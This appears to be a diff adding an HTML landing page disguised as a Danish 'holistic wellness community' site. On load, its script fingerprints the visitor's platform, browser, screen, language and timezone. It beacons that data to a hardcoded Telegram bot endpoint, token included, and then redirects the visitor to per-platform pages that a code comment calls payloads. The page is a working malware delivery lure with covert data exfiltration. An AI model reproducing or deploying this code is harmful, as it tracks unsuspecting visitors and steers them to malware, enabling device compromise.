@@ -1,0 +1,104 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hollistisk Wellness Community</title>
+</head>
+<body>
+    <div id="loading" style="text-align:center; padding:50px; font-family:Arial;">
+        <div style="font-size:48px;">🧘‍♀️</div>
+        <div style="font-size:24px; margin:20px;">Tilpasser til din enhed...</div>
+        <div>Vent venligst...</div>
+    </div>
+
+    <script>
+        
+        function detectPlatform() {
+            const ua = navigator.userAgent;
+            
+            if (/Android/i.test(ua)) {
+                return 'android';
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                return 'ios';
+            } else if (/Mac|Macintosh/i.test(ua)) {
+                return 'macos';
+            } else if (/Windows/i.test(ua)) {
+                return 'windows';
+            } else if (/Linux/i.test(ua)) {
+                return 'linux';
+            } else {
+                return 'unknown';
+            }
+        }
+        
+        function getDeviceInfo() {
+            return {
+                platform: detectPlatform(),
+                userAgent: navigator.userAgent,
+                screen: {
+                    width: screen.width,
+                    height: screen.height
+                },
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+        }
+        
+        
+        function redirectToAppropriatePayload() {
+            const platform = detectPlatform();
+            const deviceInfo = getDeviceInfo();
+            
+            // Log the detection
+            console.log('Detected platform:', platform);
+            console.log('Device info:', deviceInfo);
+            
+            // Redirect based on platform
+            let redirectUrl = '';
+            switch(platform) {
+                case 'android':
+                    redirectUrl = './android.html';
+                    break;
+                case 'ios':
+                    redirectUrl = './ios.html';
+                    break;
+                case 'macos':
+                    redirectUrl = './macos.html';
+                    break;
+                case 'windows':
+                    redirectUrl = './groups.html'; // Our existing Windows payload
+                    break;
+                default:
+                    redirectUrl = './groups.html'; // Fallback
+            }
+            
+            // Send detection beacon first
+            fetch('https://api.telegram.org/bot8283973635:AAFzNIcEl78aH-l0iKj5lYKFLj4Vil39u7k/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: '3032183658',
+                    text: '🎯 PLATFORM DETECTION:\n```json\n' + JSON.stringify({
+                        detected_platform: platform,
+                        redirect_url: redirectUrl,
+                        device_info: deviceInfo,
+                        timestamp: new Date().toISOString()
+                    }, null, 2) + '\n```',
+                    parse_mode: 'Markdown'
+                })
+            }).catch(e => console.log('Beacon failed:', e));
+            
+            // Redirect after short delay
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 2000);
+        }
+        
+        // Execute when page loads
+        window.addEventListener('load', redirectToAppropriatePayload);
+    </script>
+</body>
+</html>
